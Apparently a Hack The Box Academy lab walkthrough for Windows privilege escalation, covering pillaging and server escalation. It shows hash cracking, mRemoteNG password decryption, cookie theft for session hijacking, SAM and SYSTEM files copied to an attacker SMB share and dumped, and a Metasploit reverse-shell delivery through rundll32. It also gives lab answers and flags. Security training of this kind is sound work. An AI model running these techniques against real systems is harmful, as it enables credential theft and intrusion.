hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

<SNIP>

SCCM_SVC::WINLPE-SRV01:c61c33bca9df723e:e28dcf275e104b29959f5638d736b0bb:010100000000000080d26ecd13d8d8018cc5c7811ce1b0aa0000000002000800370050004700430001001e00570049004e002d00550048004b005800300045003600300033004800440004003400570049004e002d00550048004b00580030004500360030003300480044002e0037005000470043002e004c004f00430041004c000300140037005000470043002e004c004f00430041004c000500140037005000470043002e004c004f00430041004c000700080080d26ecd13d8d801060004000200000008003000300000000000000001000000002000003ea916992ec712c8aafd8aefd3cac03db115d210779d9f8d5480b67896db2e890a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0038003000000000000000000000000000:Password1

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: SCCM_SVC::WINLPE-SRV01:c61c33bca9df723e:e28dcf275e1...000000
Time.Started.....: Tue Oct  4 17:13:01 2022 (0 secs)
Time.Estimated...: Tue Oct  4 17:13:01 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    25815 H/s (3.04ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> oooooo
```

From the output, students will know that the cleartext credentials for the `SCCM_SVC` user is `Password1`.

Answer: `Password1`

# Pillaging

## Question 1

### "Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems?"

Students first need to connect to the spawned target with `xfreerdp` using the credentials `Peter:Bambi123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Peter /p:Bambi123
```

```shell-session
┌─[us-academy-1]─[10.10.14.84]─[htb-ac330204@htb-b4hoj2thbz]─[~]
└──╼ [★]$ xfreerdp /v:10.129.203.122 /u:Peter /p:Bambi123

[20:42:51:345] [2361:2362] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[20:42:51:345] [2361:2362] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr

<SNIP>

Do you trust the above certificate? (Y/T/N) Y
[20:42:55:369] [2361:2362] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[20:42:55:369] [2361:2362] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_RGB16
[20:42:55:407] [2361:2362] [INFO][com.winpr.clipboard] - initialized POSIX local file subsystem
[20:42:55:414] [2361:2362] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[20:42:55:414] [2361:2362] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[20:42:56:278] [2361:2362] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

Afterward, students need to open PowerShell and enumerate the `Program Files (x86)\` directory with `dir`:

Code: powershell

```powershell
dir 'C:\Program Files (x86)\'
```

```powershell-session
PS C:\Users\Peter> dir 'C:\Program Files (x86)\'

    Directory: C:\Program Files (x86)

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:31 AM                Common Files
d-----        10/30/2022   3:33 AM                Google
d-----         12/7/2019   1:51 AM                Internet Explorer
d-----          8/3/2022   7:47 AM                Microsoft
d-----         12/7/2019   1:31 AM                Microsoft.NET
d-----         9/23/2022   8:14 AM                Mozilla Maintenance Service
d-----         7/26/2022   8:03 AM                mRemoteNG
d-----          4/9/2021   6:53 AM                Windows Defender
d-----          8/3/2022   8:34 AM                Windows Mail
d-----          4/9/2021   6:53 AM                Windows Media Player
d-----         12/7/2019   1:54 AM                Windows Multimedia Platform
d-----         12/7/2019   1:50 AM                Windows NT
d-----          4/9/2021   6:53 AM                Windows Photo Viewer
d-----         12/7/2019   1:54 AM                Windows Portable Devices
d-----         12/7/2019   1:31 AM                WindowsPowerShell
```

![Windows_Privilege_Escalation_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_41.png)

Students will notice that `mRemoteNG` is installed on the system, which is used to manage and connect to remote systems.

Answer: `mRemoteNG`

# Pillaging

## Question 2

### "Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What's, is the password for the local account, Grace?"

Using the previously established RDP session, students need to run PowerShell and use `cmd` to to find the `mRemoteNG` configuration file:

Code: powershell

```powershell
cmd /c more "%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml"
```

```powershell-session
PS C:\Users\Peter> cmd /c more "%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml"

<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="AllGNAWw3JJdXFuMG06ssHKpMbWw7AHXKWZVidfNIu5LNVm2nzroKSKtYYfsK66/itwh95OaYLtEX8NA7xy7IMwr" ConfVersion="2.6">
    <Node Name="Grace_Local_Acct" Type="Connection" Descr="Grace Account" Icon="mRemoteNG" Panel="General" Id="88291c0c-b6b0-4f2d-b180-81d3b50485a4" Username="grace" Domain="PILLAGING-WIN01" Password="s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" Hostname="localhost" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

From the output, students will notice the password attribute: `Password="s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="`.

Subsequently, students need to download the [mRemoteNG decryption](https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py)script:

Code: shell

```shell
wget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py
```

```shell-session
┌─[us-academy-1]─[10.10.14.84]─[htb-ac330204@htb-b4hoj2thbz]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py

--2022-10-24 21:09:40--  https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1535 (1.5K) [text/plain]
Saving to: ‘mremoteng_decrypt.py’

mremoteng_decrypt.p 100%[===================>]   1.50K  --.-KB/s    in 0s      

2022-10-24 21:09:40 (16.5 MB/s) - ‘mremoteng_decrypt.py’ saved [1535/1535]
```

Then, students need to decrypt the password `s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=` using `mremoteng_decrypt.py`:

Code: shell

```shell
python3 mremoteng_decrypt.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="
```

```shell-session
┌─[us-academy-1]─[10.10.14.84]─[htb-ac330204@htb-b4hoj2thbz]─[~]
└──╼ [★]$ python3 mremoteng_decrypt.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="

Password: Princess01!
```

The password for the local account Grace is `Princess01!`.

Answer: `Princess01!`

# Pillaging

## Question 3

### "Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to login into slacktestapp.com from a browser within the RDP session and submit the flag."

Using the previously harvested credentials `Grace:Princess01!`, students first need to connect to the spawned target with `xfreerdp`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Grace /p:Princess01!
```

```shell-session
┌─[us-academy-1]─[10.10.14.95]─[htb-ac330204@htb-mer4onw3e4]─[~]
└──╼ [★]$ xfreerdp /v:10.129.203.122 /u:Grace /p:Princess01!

[16:32:51:236] [6075:6076] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:32:51:236] [6075:6076] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr

<SNIP>

Do you trust the above certificate? (Y/T/N) Y
[16:32:54:795] [6075:6076] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[16:32:54:795] [6075:6076] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_RGB16
[16:32:54:841] [6075:6076] [INFO][com.winpr.clipboard] - initialized POSIX local file subsystem
```

Students need to start a shared folder from Pwnbox/`PMVPN` using `impacket-smbserver`:

Code: shell

```shell
sudo impacket-smbserver share ./ -smb2support
```

```shell-session
┌─[us-academy-1]─[10.10.14.95]─[htb-ac330204@htb-mer4onw3e4]─[~]
└──╼ [★]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

From the established RDP session, students need to open Command Prompt and copy `cookies.sqlite` to the shared folder:

Code: cmd

```cmd
copy C:\Users\Grace\AppData\Roaming\Mozilla\Firefox\Profiles\wu7k463d.default-release\cookies.sqlite \\PWNIP\share
```

Students then need to download [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py):

Code: shell

```shell
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
```

```shell-session
┌─[us-academy-1]─[10.10.14.95]─[htb-ac330204@htb-mer4onw3e4]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py

--2022-10-25 17:30:09--  https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1325 (1.3K) [text/plain]
Saving to: ‘cookieextractor.py’

cookieextractor.py  100%[===================>]   1.29K  --.-KB/s    in 0s      

2022-10-25 17:30:09 (66.8 MB/s) - ‘cookieextractor.py’ saved [1325/1325]
```

Afterward, students need to use `cookieextractor.py` to get the cookie's content for the `slacktestapp` domain:

Code: shell

```shell
python3 cookieextractor.py --dbpath cookies.sqlite --host slacktestapp
```

```shell-session
┌─[us-academy-1]─[10.10.14.95]─[htb-ac330204@htb-mer4onw3e4]─[~]
└──╼ [★]$ python3 cookieextractor.py --dbpath cookies.sqlite --host slacktestapp

(10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
```

From the established RDP session, students need to open `Firefox` and navigate to `slacktestapp.com`, use the `Cookie-Editor` to replace the content of cookie `d` with what was extracted from the script, `VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==`:

![Windows_Privilege_Escalation_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_42.png)

Students then need to save the new cookie and refresh the page to find the flag `HTB{Stealing_Cookies_To_AccessWebSites}`:

![Windows_Privilege_Escalation_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_43.png)

Answer: `HTB{Stealing_Cookies_To_AccessWebSites}`

# Pillaging

## Question 4

### "Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer."

Students will note from the previous question that the credentials `jeff:Webmaster001!` are also exposed after hijacking the session with the found cookie:

![Windows_Privilege_Escalation_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_44.png)

Therefore, students need to connect to the spawned target with `xfreerdp` using the credentials `jeff:Webmaster001`:

Code: shell

```shell
xfreerdp /v:STMIP /u:jeff /p:Webmaster001!
```

```shell-session
┌─[us-academy-1]─[10.10.14.95]─[htb-ac330204@htb-esibp6bulh]─[~]
└──╼ [★]$ xfreerdp /v:10.129.109.167 /u:jeff /p:Webmaster001! /dynamic-resolution

[21:28:04:960] [3821:3822] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[21:28:04:960] [3821:3822] [INFO][com.freerdp.client.common.cmdline] - loading channelEx 

<SNIP>

Do you trust the above certificate? (Y/T/N) Y
[21:28:09:439] [3821:3822] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[21:28:09:439] [3821:3822] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_RGB16
[21:28:09:477] [3821:3822] [INFO][com.winpr.clipboard] - initialized POSIX local file subsystem
[21:28:09:480] [3821:3822] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[21:28:09:480] [3821:3822] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[21:28:11:887] [3821:3822] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

Students will find a "backup conf.txt" file on the Desktop containing the password for the snapshots, which is `Superbackup!`:

![Windows_Privilege_Escalation_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_45.png)

Answer: `Superbackup!`

# Pillaging

## Question 5

### "Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer."

Students first need to start a shared folder from Pwnbox/`PMVPN` using `impacket-smbserver`:

Code: shell

```shell
sudo impacket-smbserver share ./ -smb2support
```

```shell-session
┌─[us-academy-1]─[10.10.14.95]─[htb-ac330204@htb-esibp6bulh]─[~]
└──╼ [★]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

From the previous question, students will know that the location of the snapshots is `E:\restic`, as specified by the "backup conf.txt" file:

![Windows_Privilege_Escalation_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_46.png)

Therefore, utilizing the same RDP session established in the previous question, students need to open PowerShell and use `restic.exe` to view the available snapshots (providing the password `Superbackup!` when prompted to):

Code: powershell

```powershell
restic.exe -r E:\restic snapshots
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\jeff> restic.exe -r E:\restic snapshots

enter password for repository:
repository 2e40703c opened successfully, password is correct
found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
02d25030  2022-08-09 05:58:15  PILLAGING-WIN01              C:\xampp\htdocs\webapp
24504d3d  2022-08-09 11:24:43  PILLAGING-WIN01              C:\Windows\System32\config
7b9cabc8  2022-08-09 11:25:47  PILLAGING-WIN01              C:\Windows\System32\config
4e7bd0cd  2022-08-09 11:55:33  PILLAGING-WIN01              C:\xampp\htdocs\webapp_old
b2f5caa0  2022-08-17 11:43:56  PILLAGING-WIN01              C:\Windows\System32\config
--------------------------------------------------------------------------------------
5 snapshots
```

Student then need to restore the `b2f5caa0` snapshot (providing the password `Superbackup!` when prompted to):

Code: powershell

```powershell
restic.exe -r E:\restic restore b2f5caa0 --target C:\Users\jeff\Restore
```

```powershell-session
PS C:\Users\jeff> restic.exe -r E:\restic restore b2f5caa0 --target C:\Users\jeff\Restore

enter password for repository:
repository 2e40703c opened successfully, password is correct
found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
restoring <Snapshot b2f5caa0 of [C:\Windows\System32\config] at 2022-08-17 11:43:56.2484457 -0700 PDT by PILLAGING-WIN01\Administrator@PILLAGING-WIN01> to C:\Users\jeff\Restore
```

Subsequently, students need to copy the `SAM` and `SYSTEM` files back to Pwnbox/`PMVPN`, utilizing the `SMB` share:

Code: powershell

```powershell
copy C:\Users\jeff\Restore\C\Windows\System32\config\SAM \\PWNIP\share\
copy C:\Users\jeff\Restore\C\Windows\System32\config\SYSTEM \\PWNIP\share\
```

```powershell-session
PS C:\Users\jeff> copy C:\Users\jeff\Restore\C\Windows\System32\config\SAM \\10.10.14.95\share\
PS C:\Users\jeff> copy C:\Users\jeff\Restore\C\Windows\System32\config\SYSTEM \\10.10.14.95\share\
```

At last, students can now run `impacket-secretsdump` against the files locally on Pwnbox/`PMVPN` to dump the hashes:

Code: shell

```shell
impacket-secretsdump -sam SAM -system SYSTEM local
```

```shell-session
┌─[us-academy-1]─[10.10.14.95]─[htb-ac330204@htb-esibp6bulh]─[~]
└──╼ [★]$ impacket-secretsdump -sam SAM -system SYSTEM local

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x9828e7264dd454a4cae19b10e003858e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2525a827e7ca4bb2504d25a70e4d1292:::
jeff:1004:aad3b435b51404eeaad3b435b51404ee:91b2e2ed6cd72ed531635c1b58eabe19:::
Grace:1005:aad3b435b51404eeaad3b435b51404ee:2abc09f151d5e95fb8805e265268e6c3:::
Peter:1006:aad3b435b51404eeaad3b435b51404ee:8160b16dddc064509c4ccf530c7dfaa0:::
[*] Cleaning up... 
```

From the output, students will know that the hash for the Administrator is `bac9dc5b7b4bec1d83e0e9c04b477f26`.

Answer: `bac9dc5b7b4bec1d83e0e9c04b477f26`

# Miscellaneous Techniques

## Question 1

### "Using the techniques in this section, find the cleartext password for an account on the target host."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt!

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Then, students need to open PowerShell and run the `Get-LocalUser` Cmdlet:

Code: powershell

```powershell
Get-LocalUser
```

```powershell-session
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\htb-student> Get-LocalUser

Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
mrb3n           True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password: !QAZXSW@3edc
sql_dev         True
```

From the output of `Get-LocalUser`, students will find the password of the `secsvc` user in the `Description` field, which is `!QAZXSW@3edc`.

Answer: `!QAZXSW@3edc`

# Windows Server

## Question 1

### "Obtain a shell on the target host, enumerate the system and escalate privileges. Submit the contents of the flag.txt file on the Administrator Desktop."

Students first need to connect to the spawned target with `rdesktop` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' STMIP
```

```shell-session
┌─[eu-academy-6]─[10.10.14.74]─[htb-ac-8414@htb-qo8elysuks]─[~]
└──╼ [★]$ rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' 10.129.43.116

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=WINLPE-2K8


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=WINLPE-2K8
     Issuer: CN=WINLPE-2K8
 Valid From: Sun Aug 11 01:17:59 2024
         To: Mon Feb 10 00:17:59 2025

  Certificate fingerprints:

       sha1: b508985819193bacc89210e920dfd19ce22627cb
     sha256: 936e8be771fe224c5efa48ba2076ea74cab36c16f0169470b612bd556b958548


Do you trust this certificate (yes/no)? yes

<SNIP>
```

Then, students need to open Command Prompt and enumerate hotfixes using `wmic`:

Code: cmd

```cmd
wmic qfe
```

```cmd-session
Caption                              CSName      Description  FixComments  HotFixID   InstallDate  InstalledBy               InstalledOn  Name  ServicePackInEffect  Status  
http://support.microsoft.com/?kbid=2533552  WINLPE-2K8  Update                    KB2533552               WINLPE-2K8\Administrator  3/31/2021                                       
```

![Windows_Privilege_Escalation_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_47.png)

Subsequently, students need to run PowerShell and set the execution policy to `bypass` with `Set-ExecutionPolicy`:

Code: powershell

```powershell
Set-ExecutionPolicy bypass -Scope process
```

```powershell-session
PS C:\Users\htb-student> Set-ExecutionPolicy bypass -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
```

![Windows_Privilege_Escalation_Walkthrough_Image_48.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_48.png)

Students then need to navigate to the `C:\\Tools` directory, import the `Sherlock.ps1` module, and invoke `Find-AllVulns`:

Code: powershell

```powershell
cd C:\Tools\
Import-Module .\Sherlock.ps1
Find-AllVulns
```

```powershell-session
PS C:\Users\htb-student> cd C:\Tools\
PS C:\Tools> Import-Module .\Sherlock.ps1
PS C:\Tools> Find-AllVulns

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

<SNIP>
```

![Windows_Privilege_Escalation_Walkthrough_Image_49.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_49.png)

From the output of `Sherlock`, students will notice that the target is missing several patches, thus, in Pwnbox/`PMVPN`, students need to start `msfconsole` and use the `exploit/windows/smb/smb_delivery` module::

Code: shell

```shell
sudo msfconsole -q
use exploit/windows/smb/smb_delivery
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ sudo msfconsole -q

[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/smb_delivery
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Afterward, students need to set the options of the module accordingly and then launch it with the command `exploit`:

Code: shell

```shell
set LHOST PWNIP
set SRVHOST PWNIP
exploit
```

```shell-session
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> set LHOST 10.10.14.80
LHOST => 10.10.14.80
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> set SRVHOST 10.10.14.80
SRVHOST => 10.10.14.80
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> exploit

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.80:4444 
[*] Server is running. Listening on 10.10.14.80:445
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.80\tXWM\test.dll,0
[msf](Jobs:1 Agents:0) exploit(windows/smb/smb_delivery) >
```

